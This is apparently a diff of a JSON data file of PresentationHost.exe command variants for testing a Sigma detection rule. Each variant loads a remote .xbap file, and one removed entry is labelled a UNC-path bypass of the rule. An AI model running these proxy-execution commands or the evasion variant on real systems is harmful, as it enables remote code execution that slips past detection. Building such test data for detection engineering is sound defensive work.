@@ -1,22 +1,14 @@
 [
   {
-    "output": "PresentationHost.exe \"http://192.168.1.50/share/payload.xbap\"",
-    "explanation": "The command uses double quotes to safely wrap the URL, which is a valid mutation technique. The protocol 'http://' is unchanged, and the command remains a true positive for the Sigma rule."
+    "output": "PresentationHost.exe - \"http://example.com/file.xbap\"",
+    "explanation": "The command uses quotes to safely wrap the URL, which is a common mutation technique. It simulates a valid invocation of PresentationHost.exe with a URL, matching the Sigma rule's detection criteria."
   },
   {
-    "output": "PresentationHost.exe - http://192.168.1.50/share/payload.xbap",
-    "explanation": "The command adds a redundant '-' at the start, which is a safe insertion and does not affect the execution or detection by the Sigma rule. The URL remains unchanged and triggers the rule."
+    "output": "PresentationHost.exe -- \"https://example.com/resource.xbap\"",
+    "explanation": "The command uses a double dash to separate arguments, which is a safe mutation technique. It simulates a valid invocation of PresentationHost.exe with a URL, matching the Sigma rule's detection criteria."
   },
   {
-    "output": "PresentationHost.exe https://192.168.1.50/share/payload.xbap",
-    "explanation": "The protocol is changed from 'http://' to 'https://', which is a substitution of equivalent syntax. The Sigma rule includes 'https://' in its detection, so this remains a true positive."
-  },
-  {
-    "output": "PresentationHost.exe ftp://192.168.1.50/share/payload.xbap",
-    "explanation": "The protocol is changed to 'ftp://', which is a substitution of equivalent syntax included in the Sigma rule's detection. The command remains a true positive."
-  },
-  {
-    "output": "PresentationHost.exe \\\\192.168.1.50\\share\\payload.xbap",
-    "explanation": "The command uses double backslashes for path representation, which is a safe recoding technique. The Sigma rule does not detect UNC paths, so this is not a true positive and demonstrates a potential bypass."
+    "output": "PresentationHost.exe http://example.com/data.xbap",
+    "explanation": "This is a straightforward invocation of PresentationHost.exe with a URL, matching the Sigma rule's detection criteria without any mutation techniques applied."
   }
 ]
